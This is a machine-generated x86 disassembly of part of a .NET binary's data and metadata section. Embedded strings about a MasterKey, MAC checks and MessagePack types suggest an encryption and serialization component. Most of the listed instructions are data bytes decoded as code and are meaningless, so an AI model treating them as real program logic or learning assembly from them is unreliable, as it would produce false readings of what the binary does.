  40bc41:	72 00                	jb     0x40bc43
  40bc43:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc44:	00 72 00             	add    %dh,0x0(%edx)
  40bc47:	00 47 6d             	add    %al,0x6d(%edi)
  40bc4a:	00 61 00             	add    %ah,0x0(%ecx)
  40bc4d:	73 00                	jae    0x40bc4f
  40bc4f:	74 00                	je     0x40bc51
  40bc51:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc55:	4b                   	dec    %ebx
  40bc56:	00 65 00             	add    %ah,0x0(%ebp)
  40bc59:	79 00                	jns    0x40bc5b
  40bc5b:	20 00                	and    %al,(%eax)
  40bc5d:	63 00                	arpl   %eax,(%eax)
  40bc5f:	61                   	popa
  40bc60:	00 6e 00             	add    %ch,0x0(%esi)
  40bc63:	20 00                	and    %al,(%eax)
  40bc65:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc66:	00 6f 00             	add    %ch,0x0(%edi)
  40bc69:	74 00                	je     0x40bc6b
  40bc6b:	20 00                	and    %al,(%eax)
  40bc6d:	62 00                	bound  %eax,(%eax)
  40bc6f:	65 00 20             	add    %ah,%gs:(%eax)
  40bc72:	00 6e 00             	add    %ch,0x0(%esi)
  40bc75:	75 00                	jne    0x40bc77
  40bc77:	6c                   	insb   (%dx),%es:(%edi)
  40bc78:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40bc7c:	00 6f 00             	add    %ch,0x0(%edi)
  40bc7f:	72 00                	jb     0x40bc81
  40bc81:	20 00                	and    %al,(%eax)
  40bc83:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40bc87:	70 00                	jo     0x40bc89
  40bc89:	74 00                	je     0x40bc8b
  40bc8b:	79 00                	jns    0x40bc8d
  40bc8d:	2e 00 00             	add    %al,%cs:(%eax)
  40bc90:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40bc95:	70 00                	jo     0x40bc97
  40bc97:	75 00                	jne    0x40bc99
  40bc99:	74 00                	je     0x40bc9b
  40bc9b:	20 00                	and    %al,(%eax)
  40bc9d:	63 00                	arpl   %eax,(%eax)
  40bc9f:	61                   	popa
  40bca0:	00 6e 00             	add    %ch,0x0(%esi)
  40bca3:	20 00                	and    %al,(%eax)
  40bca5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bca6:	00 6f 00             	add    %ch,0x0(%edi)
  40bca9:	74 00                	je     0x40bcab
  40bcab:	20 00                	and    %al,(%eax)
  40bcad:	62 00                	bound  %eax,(%eax)
  40bcaf:	65 00 20             	add    %ah,%gs:(%eax)
  40bcb2:	00 6e 00             	add    %ch,0x0(%esi)
  40bcb5:	75 00                	jne    0x40bcb7
  40bcb7:	6c                   	insb   (%dx),%es:(%edi)
  40bcb8:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40bcbc:	00 00                	add    %al,(%eax)
  40bcbe:	55                   	push   %ebp
  40bcbf:	49                   	dec    %ecx
  40bcc0:	00 6e 00             	add    %ch,0x0(%esi)
  40bcc3:	76 00                	jbe    0x40bcc5
  40bcc5:	61                   	popa
  40bcc6:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bcca:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bcce:	00 6d 00             	add    %ch,0x0(%ebp)
  40bcd1:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bcd5:	73 00                	jae    0x40bcd7
  40bcd7:	61                   	popa
  40bcd8:	00 67 00             	add    %ah,0x0(%edi)
  40bcdb:	65 00 20             	add    %ah,%gs:(%eax)
  40bcde:	00 61 00             	add    %ah,0x0(%ecx)
  40bce1:	75 00                	jne    0x40bce3
  40bce3:	74 00                	je     0x40bce5
  40bce5:	68 00 65 00 6e       	push   $0x6e006500
  40bcea:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bcee:	00 63 00             	add    %ah,0x0(%ebx)
  40bcf1:	61                   	popa
  40bcf2:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bcf6:	00 6f 00             	add    %ch,0x0(%edi)
  40bcf9:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcfa:	00 20                	add    %ah,(%eax)
  40bcfc:	00 63 00             	add    %ah,0x0(%ebx)
  40bcff:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd00:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bd04:	00 20                	add    %ah,(%eax)
  40bd06:	00 28                	add    %ch,(%eax)
  40bd08:	00 4d 00             	add    %cl,0x0(%ebp)
  40bd0b:	41                   	inc    %ecx
  40bd0c:	00 43 00             	add    %al,0x0(%ebx)
  40bd0f:	29 00                	sub    %eax,(%eax)
  40bd11:	2e 00 00             	add    %al,%cs:(%eax)
  40bd14:	05 58 00 32 00       	add    $0x320058,%eax
  40bd19:	00 0f                	add    %cl,(%edi)
  40bd1b:	7b 00                	jnp    0x40bd1d
  40bd1d:	30 00                	xor    %al,(%eax)
  40bd1f:	3a 00                	cmp    (%eax),%al
  40bd21:	44                   	inc    %esp
  40bd22:	00 33                	add    %dh,(%ebx)
  40bd24:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd27:	20 00                	and    %al,(%eax)
  40bd29:	00 0f                	add    %cl,(%edi)
  40bd2b:	7b 00                	jnp    0x40bd2d
  40bd2d:	30 00                	xor    %al,(%eax)
  40bd2f:	3a 00                	cmp    (%eax),%al
  40bd31:	58                   	pop    %eax
  40bd32:	00 32                	add    %dh,(%edx)
  40bd34:	00 7d 00             	add    %bh,0x0(%ebp)
  40bd37:	20 00                	and    %al,(%eax)
  40bd39:	00 2b                	add    %ch,(%ebx)
  40bd3b:	28 00                	sub    %al,(%eax)
  40bd3d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd3e:	00 65 00             	add    %ah,0x0(%ebp)
  40bd41:	76 00                	jbe    0x40bd43
  40bd43:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd47:	20 00                	and    %al,(%eax)
  40bd49:	75 00                	jne    0x40bd4b
  40bd4b:	73 00                	jae    0x40bd4d
  40bd4d:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bd52:	00 20                	add    %ah,(%eax)
  40bd54:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bd58:	00 70 00             	add    %dh,0x0(%eax)
  40bd5b:	65 00 20             	add    %ah,%gs:(%eax)
  40bd5e:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd61:	63 00                	arpl   %eax,(%eax)
  40bd63:	31 00                	xor    %eax,(%eax)
  40bd65:	00 45 28             	add    %al,0x28(%ebp)
  40bd68:	00 65 00             	add    %ah,0x0(%ebp)
  40bd6b:	78 00                	js     0x40bd6d
  40bd6d:	74 00                	je     0x40bd6f
  40bd6f:	38 00                	cmp    %al,(%eax)
  40bd71:	2c 00                	sub    $0x0,%al
  40bd73:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd77:	74 00                	je     0x40bd79
  40bd79:	31 00                	xor    %eax,(%eax)
  40bd7b:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bd7f:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd83:	33 00                	xor    (%eax),%eax
  40bd85:	32 00                	xor    (%eax),%al
  40bd87:	29 00                	sub    %eax,(%eax)
  40bd89:	20 00                	and    %al,(%eax)
  40bd8b:	74 00                	je     0x40bd8d
  40bd8d:	79 00                	jns    0x40bd8f
  40bd8f:	70 00                	jo     0x40bd91
  40bd91:	65 00 20             	add    %ah,%gs:(%eax)
  40bd94:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd97:	63 00                	arpl   %eax,(%eax)
  40bd99:	37                   	aaa
  40bd9a:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bd9d:	24 00                	and    $0x0,%al
  40bd9f:	63 00                	arpl   %eax,(%eax)
  40bda1:	38 00                	cmp    %al,(%eax)
  40bda3:	2c 00                	sub    $0x0,%al
  40bda5:	24 00                	and    $0x0,%al
  40bda7:	63 00                	arpl   %eax,(%eax)
  40bda9:	39 00                	cmp    %eax,(%eax)
  40bdab:	00 ad 81 9c a1 a7    	add    %ch,-0x585e637f(%ebp)
  40bdb1:	dc 42 49             	faddl  0x49(%edx)
  40bdb4:	ad                   	lods   %ds:(%esi),%eax
  40bdb5:	7b c0                	jnp    0x40bd77
  40bdb7:	d7                   	xlat   %ds:(%ebx)
  40bdb8:	3f                   	aas
  40bdb9:	66 74 31             	data16 je 0x40bded
  40bdbc:	00 08                	add    %cl,(%eax)
  40bdbe:	b7 7a                	mov    $0x7a,%bh
  40bdc0:	5c                   	pop    %esp
  40bdc1:	56                   	push   %esi
  40bdc2:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40bdc5:	89 03                	mov    %eax,(%ebx)
  40bdc7:	00 00                	add    %al,(%eax)
  40bdc9:	01 03                	add    %eax,(%ebx)
  40bdcb:	20 00                	and    %al,(%eax)
  40bdcd:	01 02                	add    %eax,(%edx)
  40bdcf:	06                   	push   %es
  40bdd0:	0e                   	push   %cs
  40bdd1:	03 06                	add    (%esi),%eax
  40bdd3:	12 09                	adc    (%ecx),%cl
  40bdd5:	03 06                	add    (%esi),%eax
  40bdd7:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40bddb:	00 02                	add    %al,(%edx)
  40bddd:	03 06                	add    (%esi),%eax
  40bddf:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40bde5:	03 06                	add    (%esi),%eax
  40bde7:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40bdec:	03 06                	add    (%esi),%eax
  40bdee:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40bdf4:	06                   	push   %es
  40bdf5:	1c 02                	sbb    $0x2,%al
  40bdf7:	06                   	push   %es
  40bdf8:	08 04 00             	or     %al,(%eax,%eax,1)
  40bdfb:	00 12                	add    %dl,(%edx)
  40bdfd:	0d 05 00 01 01       	or     $0x1010005,%eax
  40be02:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40be08:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40be0e:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40be11:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40be17:	01 1d 05 03 00 00    	add    %ebx,0x305
  40be1d:	0a 04 00             	or     (%eax,%eax,1),%al
  40be20:	01 01                	add    %eax,(%ecx)
  40be22:	0a 04 00             	or     (%eax,%eax,1),%al
  40be25:	00 12                	add    %dl,(%edx)
  40be27:	15 05 00 01 01       	adc    $0x1010005,%eax
  40be2c:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40be32:	02 03                	add    (%ebx),%al
  40be34:	00 00                	add    %al,(%eax)
  40be36:	1c 03                	sbb    $0x3,%al
  40be38:	00 00                	add    %al,(%eax)
  40be3a:	08 04 00             	or     %al,(%eax,%eax,1)
  40be3d:	01 01                	add    %eax,(%ecx)
  40be3f:	08 04 00             	or     %al,(%eax,%eax,1)
  40be42:	01 02                	add    %eax,(%edx)
  40be44:	0e                   	push   %cs
  40be45:	0a 00                	or     (%eax),%al
  40be47:	04 02                	add    $0x2,%al
  40be49:	1c 12                	sbb    $0x12,%al
  40be4b:	19 12                	sbb    %edx,(%edx)
  40be4d:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40be52:	01 01                	add    %eax,(%ecx)
  40be54:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40be5a:	1c 04                	sbb    $0x4,%al
  40be5c:	08 00                	or     %al,(%eax)
  40be5e:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40be64:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40be67:	00 1d 05 03 08 00    	add    %bl,0x80305
  40be6d:	0a 04 08             	or     (%eax,%ecx,1),%al
  40be70:	00 12                	add    %dl,(%edx)
  40be72:	15 03 08 00 02       	adc    $0x2000803,%eax
  40be77:	03 08                	add    (%eax),%ecx
  40be79:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40be7c:	08 00                	or     %al,(%eax)
  40be7e:	08 03                	or     %al,(%ebx)
  40be80:	00 00                	add    %al,(%eax)
  40be82:	0e                   	push   %cs
  40be83:	04 00                	add    $0x0,%al
  40be85:	01 0e                	add    %ecx,(%esi)
  40be87:	0e                   	push   %cs
  40be88:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40be8e:	d5 0a                	aad    $0xa
  40be90:	3a 06                	cmp    (%esi),%al
  40be92:	00 01                	add    %al,(%ecx)
  40be94:	12 29                	adc    (%ecx),%ch
  40be96:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40be9c:	03 00                	add    (%eax),%eax
  40be9e:	00 18                	add    %bl,(%eax)
  40bea0:	07                   	pop    %es
  40bea1:	00 03                	add    %al,(%ebx)
  40bea3:	08 18                	or     %bl,(%eax)
  40bea5:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40beab:	18 0e                	sbb    %cl,(%esi)
  40bead:	06                   	push   %es
  40beae:	00 02                	add    %al,(%edx)
  40beb0:	02 18                	add    (%eax),%bl
  40beb2:	10 02                	adc    %al,(%edx)
  40beb4:	06                   	push   %es
  40beb5:	00 01                	add    %al,(%ecx)
  40beb7:	11 30                	adc    %esi,(%eax)
  40beb9:	11 30                	adc    %esi,(%eax)
  40bebb:	06                   	push   %es
  40bebc:	00 03                	add    %al,(%ebx)
  40bebe:	01 09                	add    %ecx,(%ecx)
  40bec0:	09 09                	or     %ecx,(%ecx)
  40bec2:	02 06                	add    (%esi),%al
  40bec4:	09 03                	or     %eax,(%ebx)
  40bec6:	06                   	push   %es
  40bec7:	11 30                	adc    %esi,(%eax)
  40bec9:	04 00                	add    $0x0,%al
  40becb:	00 00                	add    %al,(%eax)
  40becd:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40bed1:	00 00                	add    %al,(%eax)
  40bed3:	04 01                	add    $0x1,%al
  40bed5:	00 00                	add    %al,(%eax)
  40bed7:	00 06                	add    %al,(%esi)
  40bed9:	00 02                	add    %al,(%edx)
  40bedb:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40bede:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40bee3:	0e                   	push   %cs
  40bee4:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bee9:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40beee:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bef3:	60                   	pusha
  40bef4:	05 00 01 01 12       	add    $0x12010100,%eax
  40bef9:	60                   	pusha
  40befa:	04 00                	add    $0x0,%al
  40befc:	01 01                	add    %eax,(%ecx)
  40befe:	0e                   	push   %cs
  40beff:	18 06                	sbb    %al,(%esi)
  40bf01:	15 12 45 01 15       	adc    $0x15014512,%eax
  40bf06:	12 49 0a             	adc    0xa(%ecx),%cl
  40bf09:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40bf0c:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40bf12:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bf17:	0e                   	push   %cs
  40bf18:	04 20                	add    $0x20,%al
  40bf1a:	00 00                	add    %al,(%eax)
  40bf1c:	00 04 40             	add    %al,(%eax,%eax,2)
  40bf1f:	00 00                	add    %al,(%eax)
  40bf21:	00 04 10             	add    %al,(%eax,%edx,1)
  40bf24:	00 00                	add    %al,(%eax)
  40bf26:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bf29:	01 01                	add    %eax,(%ecx)
  40bf2b:	0e                   	push   %cs
  40bf2c:	04 20                	add    $0x20,%al
  40bf2e:	01 0e                	add    %ecx,(%esi)
  40bf30:	0e                   	push   %cs
  40bf31:	06                   	push   %es
  40bf32:	20 01                	and    %al,(%ecx)
  40bf34:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bf39:	20 02                	and    %al,(%edx)
  40bf3b:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bf41:	00 01                	add    %al,(%ecx)
  40bf43:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bf48:	06                   	push   %es
  40bf49:	11 50 03             	adc    %edx,0x3(%eax)
  40bf4c:	06                   	push   %es
  40bf4d:	12 55 05             	adc    0x5(%ebp),%dl
  40bf50:	00 01                	add    %al,(%ecx)
  40bf52:	0e                   	push   %cs
  40bf53:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf58:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bf5d:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bf63:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bf69:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bf6f:	01 01                	add    %eax,(%ecx)
  40bf71:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf76:	60                   	pusha
  40bf77:	03 20                	add    (%eax),%esp
  40bf79:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bf7c:	20 00                	and    %al,(%eax)
  40bf7e:	02 03                	add    (%ebx),%al
  40bf80:	28 00                	sub    %al,(%eax)
  40bf82:	1c 03                	sbb    $0x3,%al
  40bf84:	06                   	push   %es
  40bf85:	12 60 0b             	adc    0xb(%eax),%ah
  40bf88:	20 02                	and    %al,(%edx)
  40bf8a:	01 12                	add    %edx,(%edx)
  40bf8c:	60                   	pusha
  40bf8d:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf92:	60                   	pusha
  40bf93:	04 20                	add    $0x20,%al
  40bf95:	00 12                	add    %dl,(%edx)
  40bf97:	60                   	pusha
  40bf98:	05 20 01 12 60       	add    $0x60120120,%eax
  40bf9d:	0e                   	push   %cs
  40bf9e:	05 20 01 12 60       	add    $0x60120120,%eax
  40bfa3:	0a 05 20 01 12 60    	or     0x60120120,%al
  40bfa9:	0d 05 20 01 12       	or     $0x12012005,%eax
  40bfae:	60                   	pusha
  40bfaf:	08 03                	or     %al,(%ebx)
  40bfb1:	20 00                	and    %al,(%eax)
  40bfb3:	08 05 28 01 12 60    	or     %al,0x60120128
  40bfb9:	08 03                	or     %al,(%ebx)
  40bfbb:	28 00                	sub    %al,(%eax)
  40bfbd:	08 03                	or     %al,(%ebx)
  40bfbf:	06                   	push   %es
  40bfc0:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40bfc4:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40bfc8:	01 08                	add    %ecx,(%eax)
  40bfca:	0e                   	push   %cs
  40bfcb:	05 20 01 01 12       	add    $0x12010120,%eax
  40bfd0:	61                   	popa
  40bfd1:	04 20                	add    $0x20,%al
  40bfd3:	01 01                	add    %eax,(%ecx)
  40bfd5:	0a 04 20             	or     (%eax,%eiz,1),%al
  40bfd8:	01 01                	add    %eax,(%ecx)
  40bfda:	0b 03                	or     (%ebx),%eax
  40bfdc:	20 00                	and    %al,(%eax)
  40bfde:	0b 03                	or     (%ebx),%eax
  40bfe0:	20 00                	and    %al,(%eax)
  40bfe2:	0a 03                	or     (%ebx),%al
  40bfe4:	20 00                	and    %al,(%eax)
  40bfe6:	0d 05 20 01 01       	or     $0x1012005,%eax
  40bfeb:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40bff0:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40bff5:	01 0e                	add    %ecx,(%esi)
  40bff7:	0e                   	push   %cs
  40bff8:	05 20 02 01 0e       	add    $0xe010220,%eax
  40bffd:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c000:	01 02                	add    %eax,(%edx)
  40c002:	0e                   	push   %cs
  40c003:	03 20                	add    (%eax),%esp
  40c005:	00 0e                	add    %cl,(%esi)
  40c007:	04 20                	add    $0x20,%al
  40c009:	01 01                	add    %eax,(%ecx)
  40c00b:	02 04 20             	add    (%eax,%eiz,1),%al
  40c00e:	01 01                	add    %eax,(%ecx)
  40c010:	0c 04                	or     $0x4,%al
  40c012:	20 01                	and    %al,(%ecx)
  40c014:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c01a:	5c                   	pop    %esp
  40c01b:	04 20                	add    $0x20,%al
  40c01d:	00 11                	add    %dl,(%ecx)
  40c01f:	64 04 20             	fs add $0x20,%al
  40c022:	00 12                	add    %dl,(%edx)
  40c024:	59                   	pop    %ecx
  40c025:	03 28                	add    (%eax),%ebp
  40c027:	00 0e                	add    %cl,(%esi)
  40c029:	03 28                	add    (%eax),%ebp
  40c02b:	00 0a                	add    %cl,(%edx)
  40c02d:	03 28                	add    (%eax),%ebp
  40c02f:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40c035:	5c                   	pop    %esp
  40c036:	04 28                	add    $0x28,%al
  40c038:	00 11                	add    %dl,(%ecx)
  40c03a:	64 04 00             	fs add $0x0,%al
  40c03d:	00 00                	add    %al,(%eax)
  40c03f:	00 04 03             	add    %al,(%ebx,%eax,1)
  40c042:	00 00                	add    %al,(%eax)
  40c044:	00 04 04             	add    %al,(%esp,%eax,1)
  40c047:	00 00                	add    %al,(%eax)
  40c049:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40c050:	06                   	push   %es
  40c051:	00 00                	add    %al,(%eax)
  40c053:	00 04 07             	add    %al,(%edi,%eax,1)
  40c056:	00 00                	add    %al,(%eax)
  40c058:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c05b:	00 00                	add    %al,(%eax)
  40c05d:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c060:	00 00                	add    %al,(%eax)
  40c062:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c065:	00 00                	add    %al,(%eax)
  40c067:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c06a:	00 00                	add    %al,(%eax)
  40c06c:	00 06                	add    %al,(%esi)
  40c06e:	00 02                	add    %al,(%edx)
  40c070:	0e                   	push   %cs
  40c071:	12 61 08             	adc    0x8(%ecx),%ah
  40c074:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c079:	61                   	popa
  40c07a:	06                   	push   %es
  40c07b:	00 02                	add    %al,(%edx)
  40c07d:	0e                   	push   %cs
  40c07e:	05 12 61 05 00       	add    $0x56112,%eax
  40c083:	01 01                	add    %eax,(%ecx)
  40c085:	12 61 06             	adc    0x6(%ecx),%ah
  40c088:	00 02                	add    %al,(%edx)
  40c08a:	01 12                	add    %edx,(%edx)
  40c08c:	61                   	popa
  40c08d:	0e                   	push   %cs
  40c08e:	07                   	pop    %es
  40c08f:	00 02                	add    %al,(%edx)
  40c091:	01 12                	add    %edx,(%edx)
  40c093:	61                   	popa
  40c094:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c099:	01 12                	add    %edx,(%edx)
  40c09b:	61                   	popa
  40c09c:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c0a1:	12 61 0c             	adc    0xc(%ecx),%ah
  40c0a4:	06                   	push   %es
  40c0a5:	00 02                	add    %al,(%edx)
  40c0a7:	01 12                	add    %edx,(%edx)
  40c0a9:	61                   	popa
  40c0aa:	02 06                	add    (%esi),%al
  40c0ac:	00 02                	add    %al,(%edx)
  40c0ae:	01 12                	add    %edx,(%edx)
  40c0b0:	61                   	popa
  40c0b1:	0b 06                	or     (%esi),%eax
  40c0b3:	00 02                	add    %al,(%edx)
  40c0b5:	01 12                	add    %edx,(%edx)
  40c0b7:	61                   	popa
  40c0b8:	0a 03                	or     (%ebx),%al
  40c0ba:	06                   	push   %es
  40c0bb:	11 78 04             	adc    %edi,0x4(%eax)
  40c0be:	20 01                	and    %al,(%ecx)
  40c0c0:	01 08                	add    %ecx,(%eax)
  40c0c2:	08 01                	or     %al,(%ecx)
  40c0c4:	00 08                	add    %cl,(%eax)
  40c0c6:	00 00                	add    %al,(%eax)
  40c0c8:	00 00                	add    %al,(%eax)
  40c0ca:	00 1e                	add    %bl,(%esi)
  40c0cc:	01 00                	add    %eax,(%eax)
  40c0ce:	01 00                	add    %eax,(%eax)
  40c0d0:	54                   	push   %esp
  40c0d1:	02 16                	add    (%esi),%dl
  40c0d3:	57                   	push   %edi
  40c0d4:	72 61                	jb     0x40c137
  40c0d6:	70 4e                	jo     0x40c126
  40c0d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0d9:	6e                   	outsb  %ds:(%esi),(%dx)
  40c0da:	45                   	inc    %ebp
  40c0db:	78 63                	js     0x40c140
  40c0dd:	65 70 74             	gs jo  0x40c154
  40c0e0:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c0e7:	77 73                	ja     0x40c15c
  40c0e9:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c0ef:	71 08                	jno    0x40c0f9
  40c0f1:	01 00                	add    %eax,(%eax)
  40c0f3:	02 00                	add    (%eax),%al
  40c0f5:	00 00                	add    %al,(%eax)
  40c0f7:	00 00                	add    %al,(%eax)
  40c0f9:	05 01 00 00 00       	add    $0x1,%eax
  40c0fe:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c101:	00 07                	add    %al,(%edi)
  40c103:	31 2e                	xor    %ebp,(%esi)
  40c105:	30 2e                	xor    %ch,(%esi)
  40c107:	30 2e                	xor    %ch,(%esi)
  40c109:	30 00                	xor    %al,(%eax)
  40c10b:	00 65 01             	add    %ah,0x1(%ebp)
  40c10e:	00 29                	add    %ch,(%ecx)
  40c110:	2e 4e                	cs dec %esi
  40c112:	45                   	inc    %ebp
  40c113:	54                   	push   %esp
  40c114:	46                   	inc    %esi
  40c115:	72 61                	jb     0x40c178
  40c117:	6d                   	insl   (%dx),%es:(%edi)
  40c118:	65 77 6f             	gs ja  0x40c18a
  40c11b:	72 6b                	jb     0x40c188
  40c11d:	2c 56                	sub    $0x56,%al
  40c11f:	65 72 73             	gs jb  0x40c195
  40c122:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c129:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c12c:	72 6f                	jb     0x40c19d
  40c12e:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c135:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c13c:	0e                   	push   %cs
  40c13d:	14 46                	adc    $0x46,%al
  40c13f:	72 61                	jb     0x40c1a2
  40c141:	6d                   	insl   (%dx),%es:(%edi)
  40c142:	65 77 6f             	gs ja  0x40c1b4
  40c145:	72 6b                	jb     0x40c1b2
  40c147:	44                   	inc    %esp
  40c148:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c14f:	61                   	popa
  40c150:	6d                   	insl   (%dx),%es:(%edi)
  40c151:	65 1f                	gs pop %ds
  40c153:	2e 4e                	cs dec %esi
  40c155:	45                   	inc    %ebp
  40c156:	54                   	push   %esp
  40c157:	20 46 72             	and    %al,0x72(%esi)
  40c15a:	61                   	popa
  40c15b:	6d                   	insl   (%dx),%es:(%edi)
  40c15c:	65 77 6f             	gs ja  0x40c1ce
  40c15f:	72 6b                	jb     0x40c1cc
  40c161:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c164:	43                   	inc    %ebx
  40c165:	6c                   	insb   (%dx),%es:(%edi)
  40c166:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c16d:	6f                   	outsl  %ds:(%esi),(%dx)
  40c16e:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c175:	04 49                	add    $0x49,%al
  40c177:	74 65                	je     0x40c1de
  40c179:	6d                   	insl   (%dx),%es:(%edi)
  40c17a:	00 00                	add    %al,(%eax)
  40c17c:	03 07                	add    (%edi),%eax
  40c17e:	01 08                	add    %ecx,(%eax)
  40c180:	04 00                	add    $0x0,%al
  40c182:	01 08                	add    %ecx,(%eax)
  40c184:	0e                   	push   %cs
  40c185:	03 07                	add    (%edi),%eax
  40c187:	01 02                	add    %eax,(%edx)
  40c189:	05 00 00 12 80       	add    $0x80120000,%eax
  40c18e:	b1 05                	mov    $0x5,%cl
  40c190:	20 01                	and    %al,(%ecx)
  40c192:	0e                   	push   %cs
  40c193:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c198:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c19e:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c1a4:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c1a9:	03 02                	add    (%edx),%eax
  40c1ab:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c1b0:	14 07                	adc    $0x7,%al
  40c1b2:	08 0e                	or     %cl,(%esi)
  40c1b4:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c1ba:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c1c0:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c1c6:	20 03                	and    %al,(%ebx)
  40c1c8:	01 11                	add    %edx,(%ecx)
  40c1ca:	80 d5 11             	adc    $0x11,%ch
  40c1cd:	80 d9 11             	sbb    $0x11,%cl
  40c1d0:	80 dd 05             	sbb    $0x5,%ch
  40c1d3:	00 02                	add    %al,(%edx)
  40c1d5:	02 0e                	add    (%esi),%cl
  40c1d7:	0e                   	push   %cs
  40c1d8:	06                   	push   %es
  40c1d9:	20 01                	and    %al,(%ecx)
  40c1db:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c1e0:	20 01                	and    %al,(%ecx)
  40c1e2:	08 08                	or     %cl,(%eax)
  40c1e4:	07                   	pop    %es
  40c1e5:	00 01                	add    %al,(%ecx)
  40c1e7:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
